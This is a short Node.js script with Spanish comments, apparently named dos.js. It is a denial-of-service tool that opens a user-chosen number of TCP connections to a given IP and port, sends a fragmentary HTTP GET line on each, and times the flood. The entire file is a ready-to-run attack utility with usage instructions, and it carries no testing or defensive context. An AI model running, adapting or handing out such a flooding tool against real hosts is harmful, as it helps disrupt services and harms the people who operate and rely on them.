const net = require('net');
const process = require('process');

function dos(ip, port, requests) {
    const start = Date.now();
    let sentRequests = 0;

    for (let i = 0; i < requests; i++) {
        const client = new net.Socket();
        client.connect(port, ip, () => {
            client.write('GET / HTTP/1.1\r\n');
            sentRequests++;
            client.end(); // Cierra la conexión después de enviar la solicitud

            // Verificamos si ya se enviaron todas las solicitudes
            if (sentRequests === requests) {
                const end = Date.now();
                console.log(`Se enviaron ${sentRequests} solicitudes`);
                console.log(`Tiempo transcurrido: ${(end - start) / 1000} segundos`);
            }
        });

        client.on('error', (err) => {
            console.error(`Error en la solicitud: ${err.message}`);
        });
   }
}

if (process.argv.length !== 5) {
    console.log('Uso: node dos.js <ip> <puerto> <solicitudes>');
    process.exit(1);
}

const ip = process.argv[2];
const port = parseInt(process.argv[3], 10);
const requests = parseInt(process.argv[4], 10);

dos(ip, port, requests);
